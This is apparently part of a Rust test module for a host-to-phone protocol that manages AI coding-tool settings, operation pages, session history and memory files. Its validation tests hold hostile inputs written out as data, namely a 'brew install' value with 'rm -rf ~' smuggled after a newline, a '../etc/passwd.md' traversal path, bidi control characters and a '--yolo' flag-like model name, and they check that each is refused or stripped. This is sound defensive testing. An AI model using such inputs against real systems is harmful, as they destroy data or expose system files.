        let err = fetch_ops_view(|_| Ok(same.clone()), "p").unwrap_err();
        assert!(err.contains("out of order"), "{err}");
        let empty = {
            let mut page = page_json(&ops_of(0, body), None);
            page["more"] = json!(true);
            page.to_string().into_bytes()
        };
        let err = fetch_ops_view(|_| Ok(empty.clone()), "p").unwrap_err();
        assert!(err.contains("empty page"), "{err}");
    }

    /// An operation deleted on the host between two pages moves none of the
    /// others: every one still there arrives.
    #[test]
    fn an_operation_deleted_between_pages_skips_no_other() {
        let body = format!("echo {}\n", "x".repeat(60_000));
        let host = std::cell::RefCell::new(ops_of(100, &body));
        let mut pages = 0;
        let view = fetch_ops_view(
            |ask| {
                let ProjectAsk::Ops { after } = ask else {
                    return Err("not a page".into());
                };
                pages += 1;
                let bytes = ops_view_json(&host.borrow(), after.as_deref());
                if pages == 1 {
                    // op-000 is on the page just sent; it goes now.
                    host.borrow_mut().ops.remove(0);
                }
                Ok(bytes)
            },
            "p",
        )
        .unwrap();
        assert!(pages >= 2, "{pages}");
        let slugs: Vec<String> = view.ops.iter().map(|op| op.slug.clone()).collect();
        let want: Vec<String> = (0..100).map(|i| format!("op-{i:03}")).collect();
        assert_eq!(slugs, want, "op-000 as it was sent, and every other");
    }

    /// A peer from before OpenCode sends no `opencode_config`: its settings
    /// still apply, with OpenCode on the default. A word this side does not
    /// know is refused.
    #[test]
    fn settings_without_opencode_keep_its_default_and_an_unknown_word_is_refused() {
        let old = json!({"tools":"all","claude_config":"isolated","codex_config":"system","pi_config":"system","use_default_package":true,"packages":[]});
        let read = settings_from(&old).unwrap();
        assert_eq!(read.claude_config, ConfigMode::Isolated);
        assert_eq!(read.opencode_config, ConfigMode::default());
        let mut chosen = read.clone();
        chosen.opencode_config = ConfigMode::Isolated;
        chosen.tools = ProjectTools::OpenCode;
        assert_eq!(settings_from(&settings_json(&chosen)), Some(chosen));
        let mut odd = old;
        odd["opencode_config"] = json!("elsewhere");
        assert_eq!(settings_from(&odd), None);
    }

    /// A set of tools travels as `tool_list`, with `tools` saying what a peer
    /// from before sets reads (`all` for several). A write from such a peer
    /// (no `tool_list`) is marked so the host can keep its set; a list with a
    /// tool this side does not know is refused.
    #[test]
    fn a_set_of_tools_travels_and_an_older_peers_write_is_marked() {
        use connecto_core::ToolKind;
        let codex_pi = ProjectTools::from_tools([ToolKind::Codex, ToolKind::Pi]).unwrap();
        let chosen = ProjectSettings {
            tools: codex_pi,
            ..ProjectSettings::default()
        };
        let fields = settings_json(&chosen);
        assert_eq!(fields["tools"], "all");
        assert_eq!(fields["tool_list"], json!(["codex", "pi"]));
        assert_eq!(settings_from(&fields), Some(chosen.clone()));
        // An older peer reads the word alone.
        assert_eq!(
            ProjectTools::from_word(fields["tools"].as_str().unwrap()),
            Some(ProjectTools::All)
        );
        let mut odd = fields.clone();
        odd["tool_list"] = json!(["codex", "zed"]);
        assert_eq!(settings_from(&odd), None);
        odd["tool_list"] = json!([]);
        assert_eq!(settings_from(&odd), None);
        let new = ProjectAsk::SetSettings(chosen.clone()).encode();
        assert_eq!(ProjectAsk::decode(&new).unwrap(), ProjectAsk::SetSettings(chosen));
        // A host's answer says whether it knows sets: one from before them
        // sends no `tool_list`.
        let answer = |settings: Value| {
            let bytes = json!({ "packages": [], "project": { "settings": settings, "status": {} } });
            settings_answer_from(bytes.to_string().as_bytes(), "p").unwrap()
        };
        assert!(!answer(fields.clone()).tools_one_or_all);
        let mut older = fields.clone();
        older.as_object_mut().unwrap().remove("tool_list");
        let read = answer(older);
        assert!(read.tools_one_or_all);
        assert_eq!(read.project.unwrap().settings.tools, ProjectTools::All);
        let old = br#"{"ask":"set-settings","settings":{"tools":"all","claude_config":"system","codex_config":"system","pi_config":"system","opencode_config":"system","use_default_package":false,"packages":[]}}"#;
        let ProjectAsk::SetSettingsBeforeToolSets(read) = ProjectAsk::decode(old).unwrap() else {
            unreachable!("an older peer's write is read as one");
        };
        assert_eq!(read.tools, ProjectTools::All);
        let again = ProjectAsk::SetSettingsBeforeToolSets(read.clone()).encode();
        assert!(!String::from_utf8_lossy(&again).contains("tool_list"));
        assert_eq!(
            ProjectAsk::decode(&again).unwrap(),
            ProjectAsk::SetSettingsBeforeToolSets(read)
        );
    }

    /// An older peer's write names no OpenCode config: it is read as a write
    /// that keeps the project's own (applied by the packages worker), never
    /// as one that sets the default. A write that names it is taken as it is.
    #[test]
    fn an_older_peers_write_is_marked_as_keeping_opencode() {
        let old = br#"{"ask":"set-settings","settings":{"tools":"all","claude_config":"system","codex_config":"system","pi_config":"system","use_default_package":false,"packages":[]}}"#;
        let ProjectAsk::SetSettingsBeforeOpenCode(kept) = ProjectAsk::decode(old).unwrap() else {
            unreachable!("an older peer's write is read as one");
        };
        assert!(!kept.use_default_package, "the change itself is kept");
        // Sent on as the older peer sent it.
        let again = ProjectAsk::SetSettingsBeforeOpenCode(kept.clone()).encode();
        assert!(!String::from_utf8_lossy(&again).contains("opencode_config"));
        assert_eq!(
            ProjectAsk::decode(&again).unwrap(),
            ProjectAsk::SetSettingsBeforeOpenCode(kept.clone())
        );
        // A new peer says System: that is what it chose.
        let mut chosen = kept;
        chosen.opencode_config = ConfigMode::System;
        let new = ProjectAsk::SetSettings(chosen.clone()).encode();
        assert_eq!(
            ProjectAsk::decode(&new).unwrap(),
            ProjectAsk::SetSettings(chosen)
        );
    }

    #[test]
    fn an_unknown_or_malformed_ask_is_refused() {
        for raw in [
            &br#"{"ask":"delete-everything"}"#[..],
            br#"{"ask":"transcript"}"#,
            br#"{"ask":"set-settings","settings":{"tools":"everything"}}"#,
            br#"{"ask":"set-settings","settings":{"tools":"all","claude_config":"system","codex_config":"system","pi_config":"system","use_default_package":true,"packages":[7]}}"#,
            br#"{"ask":"tokens-apply","plugins":"p","skills":[]}"#,
            br#"{"ask":"tokens-apply","plugins":["ok","bad\u0007"],"skills":[]}"#,
            br#"{"ask":"tokens-autocompact","tokens":12345}"#,
            br#"{"ask":"tokens-autocompact","tokens":"200000"}"#,
            br#"{"ask":"tokens-autocompact"}"#,
            br#"{"ask":"ops-act","action":{"do":"approve","slug":"../x","hash":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}}"#,
            br#"{"ask":"ops-act","action":{"do":"approve","slug":"tests","hash":"short"}}"#,
            br#"{"ask":"ops-act","action":{"do":"run","slug":"tests","hash":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","args":["a",7]}}"#,
            br#"{"ask":"ops","after":"../x"}"#,
            br#"{"ask":"ops","after":7}"#,
            br#"{"ask":"ops-act","action":{"do":"run","slug":"tests","hash":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}}"#,
            br#"{"ask":"ops-act","action":{"do":"hook","mode":"intercept"}}"#,
            br#"{"ask":"ops-act","action":{"do":"format-disk"}}"#,
            br#"{"ask":"ops-act"}"#,
            b"not json",
        ] {
            assert!(
                ProjectAsk::decode(raw).is_err(),
                "{}",
                String::from_utf8_lossy(raw)
            );
        }
    }

    #[test]
    fn history_reads_back_cleaned_and_capped() {
        let entry = HistoryEntry {
            id: "h1".into(),
            terminal_id: "3".into(),
            name: Some("fix\u{202e} the build".into()),
            tool: ToolKind::Codex,
            parent: None,
            closed_at_ms: 42,
            task: Some("line one\nline two".into()),
            last_reply: None,
            resumable: true,
        };
        let many = vec![entry.clone(); MAX_HISTORY + 10];
        let back = history_from(&history_json(&many)).unwrap();
        assert_eq!(back.len(), MAX_HISTORY);
        assert_eq!(back[0].name.as_deref(), Some("fix  the build"));
        assert_eq!(back[0].task.as_deref(), Some("line one\nline two"));
        assert_eq!(back[0].tool, ToolKind::Codex);
        assert!(back[0].resumable);
        assert_eq!(back[0].closed_at_ms, 42);
    }

    #[test]
    fn a_transcript_keeps_its_lines_and_loses_bidi_controls() {
        let (id, text) = transcript_from(&transcript_json("h1", "a\u{202e}b\nc\u{1b}[0m")).unwrap();
        assert_eq!(id, "h1");
        assert_eq!(text, "ab\nc[0m");
    }

    #[test]
    fn settings_read_back_under_this_machines_project_id() {
        let answer = SettingsAnswer {
            packages: vec![PackageItem {
                id: "connecto".into(),
                name: "Connecto".into(),
                version: 3,
                builtin: true,
                is_default: true,
                requires: [
                    RequirementState::Checking,
                    RequirementState::Found {
                        version: Some("4.7.2".into()),
                    },
                    RequirementState::Missing,
                    RequirementState::WrongVersion {
                        version: "5.0".into(),
                        wanted: "4.7 or later, before 5".into(),
                    },
                    RequirementState::NoVersion {
                        wanted: "4.7 or later, before 5".into(),
                    },
                ]
                .into_iter()
                .enumerate()
                .map(|(i, state)| RequirementView {
                    id: format!("tool-{i}"),
                    name: "Godot".into(),
                    why: "The engine.".into(),
                    state,
                    // As long as a manifest allows, and shown exactly.
                    install: (i == 1).then(|| format!("brew install {}", "x".repeat(587))),
                    manual: "Download it.".into(),
                    url: Some("https://godotengine.org/download/".into()),
                    licence: i == 3,
                })
                .collect(),
                ..PackageItem::default()
            }],
            default_package: Some("connecto".into()),
            project: Some(ProjectPackagesView {
                project_id: "host-id".into(),
                settings: ProjectSettings {
                    tools: ProjectTools::Pi,
                    packages: vec!["x".into()],
                    ..ProjectSettings::default()
                },
                status: ProjectPackages {
                    state: InstallState::Error("folder is read-only".into()),
                    packages: vec![InstalledPackage {
                        id: "x".into(),
                        installed_version: Some(1),
                        available_version: None,
                    }],
                    warnings: vec!["w".into()],
                    checked_ms: Some(9),
                    restart_needed: true,
                    ..ProjectPackages::default()
                },
            }),
            last_error: None,
            tools_one_or_all: false,
        };
        let back = settings_answer_from(&settings_answer_json(&answer), "remote:1:h:p").unwrap();
        let mut want = answer;
        if let Some(project) = &mut want.project {
            project.project_id = "remote:1:h:p".into();
        }
        assert_eq!(back, want);
        // A command that could not be shown exactly is not offered at all.
        for bad in [
            format!("brew install {}", "x".repeat(588)),
            "brew install a\nrm -rf ~".to_owned(),
            "echo \u{202e}safe".to_owned(),
        ] {
            let mut answer = want.clone();
            answer.packages[0].requires[1].install = Some(bad.clone());
            let back =
                settings_answer_from(&settings_answer_json(&answer), "remote:1:h:p").unwrap();
            assert_eq!(back.packages[0].requires[1].install, None, "{bad:?}");
        }
    }

    #[test]
    fn tokens_read_back_under_this_machines_project_id() {
        let answer = TokensAnswer {
            available: true,
            project: Some(ProjectTokenView {
                project_id: "host-id".into(),
                settings: TokenSettings {
                    plugins_off: vec!["p@m".into()],
                    skills_off: vec![],
                    autocompact: Some(150_000),
                    applied_at: Some("2026-11-01T00:00:00Z".into()),
                    before: Some(Before {
                        start_context_median: 40_000,
                        sessions: 12,
                    }),
                },
                busy: Some("reading 23 sessions…".into()),
                report: Some(TokenReport {
                    analyzed_ms: 7,
                    totals: Totals {
                        sessions: 23,
                        cache_read_share: 91.5,
                        limited: Some("older left out".into()),
                        ..Totals::default()
                    },
                    loaded: Some(Loaded {
                        skills: 4,
                        skill_tokens: 900,
                        ..Loaded::default()
                    }),
                    proposals: vec![Proposal {
                        kind: ProposalKind::McpServer,
                        name: "srv".into(),
                        ids: vec![],
                        tokens: 1200,
                        evidence: "used 0 times in 23 sessions".into(),
                        preselected: false,
                        hint: Some("remove it from ~/.claude.json".into()),
                    }],
                    compact: CompactEstimate {
                        reads_above_200k: 12.5,
                        savings: vec![(150_000, 8.0), (200_000, 4.5)],
                    },
                    after: Some(After {
                        sessions: 2,
                        start_context_median: Some(30_000),
                        confirmation: Confirmation::StillLoaded(vec!["p".into()]),
                    }),
                    biggest: Some("big".into()),
                }),
                study: StudyState::Done(vec![StudyFinding {
                    title: "t".into(),
                    evidence: "e".into(),
                    advice: "a".into(),
                }]),
                error: None,
            }),
        };
        let back = tokens_answer_from(&tokens_answer_json(&answer), "remote:1:h:p").unwrap();
        let mut want = answer;
        if let Some(project) = &mut want.project {
            project.project_id = "remote:1:h:p".into();
        }
        assert_eq!(back, want);
    }

    #[test]
    fn functional_memory_is_read_back_checked_cleaned_and_capped() {
        use connecto_core::functional_memory::{
            FmFile, FmFiles, FmState, FmStatus, MAX_FILE_BYTES, MAX_TOTAL_BYTES,
        };
        let files = FmFiles {
            files: vec![
                FmFile {
                    path: "README.md".into(),
                    text: "# Index\n\u{202e}evil\u{7}\n".into(),
                },
                FmFile {
                    path: "state.json".into(),
                    text: "{}".into(),
                },
            ],
            truncated: false,
        };
        let status = FmStatus {
            state: FmState::Running,
            commit: Some("abc1234".into()),
            updated_ms: Some(5),
            message: Some("building".into()),
            auto: false,
            model: Some(FmModel::new(
                connecto_core::memory::Provider::Claude,
                "sonnet",
            )),
            chosen: Some(FmModel::new(
                connecto_core::memory::Provider::Claude,
                "sonnet",
            )),
            models_known: true,
            model_choice: true,
            models: vec![
                FmModel::new(connecto_core::memory::Provider::Claude, "sonnet"),
                FmModel::new(connecto_core::memory::Provider::Codex, "gpt-6.2-sol"),
            ],
        };
        let bytes = functional_memory_json(&files, &status);
        let v: Value = serde_json::from_slice(&bytes).unwrap();
        // The shape the phone reads as is.
        assert_eq!(v["files"][0]["path"], "README.md");
        assert_eq!(v["status"]["state"], "running");
        assert_eq!(v["status"]["updatedMs"], 5);
        let (got, st) = functional_memory_from(&bytes).unwrap();
        assert_eq!(got.files[0].text, "# Index\nevil\n");
        assert_eq!(got.files.len(), 2);
        assert!(!got.truncated);
        assert_eq!(st, status);
        // A host that sends what it should not: a path, a big file, too much.
        let big = "x".repeat(MAX_FILE_BYTES + 10);
        let hostile = json!({
            "files": [
                {"path": "../etc/passwd.md", "text": "no"},
                {"path": "README.md", "text": big},
                {"path": "a.md", "text": "x".repeat(MAX_FILE_BYTES)},
                {"path": "b.md", "text": "x".repeat(MAX_FILE_BYTES)},
            ],
            "status": {"state": "weird", "commit": "not hex!"},
        })
        .to_string();
        let (got, st) = functional_memory_from(hostile.as_bytes()).unwrap();
        let names: Vec<&str> = got.files.iter().map(|f| f.path.as_str()).collect();
        assert_eq!(names, ["README.md", "a.md"]);
        assert!(got.truncated);
        assert!(got.files.iter().map(|f| f.text.len()).sum::<usize>() <= MAX_TOTAL_BYTES);
        assert_eq!(st.state, FmState::None);
        assert_eq!(st.commit, None);
        assert!(functional_memory_from(b"not json").is_err());
        // A host from before the model choice sends no `modelsKnown`: its
        // card cannot offer one (rather than checking forever).
        let old_host = br#"{"files":[],"truncated":false,"status":{"state":"idle","auto":true}}"#;
        let (_, st) = functional_memory_from(old_host).unwrap();
        assert!(!st.model_choice);
        assert_eq!(st.state, FmState::Idle);
        let new_host = br#"{"files":[],"status":{"state":"idle","modelsKnown":false,"models":[]}}"#;
        assert!(functional_memory_from(new_host).unwrap().1.model_choice);
        // One change per ask: both, neither, a bad switch or a flag-like
        // model are refused.
        for bad in [
            r#"{"ask":"functional-memory-set","auto":false,"model":null}"#,
            r#"{"ask":"functional-memory-set"}"#,
            r#"{"ask":"functional-memory-set","auto":"no"}"#,
            r#"{"ask":"functional-memory-set","model":{"provider":"codex","model":"--yolo"}}"#,
            r#"{"ask":"functional-memory-set","model":{"provider":"agy","model":"x"}}"#,
        ] {
            assert!(ProjectAsk::decode(bad.as_bytes()).is_err(), "{bad}");
        }
    }
}
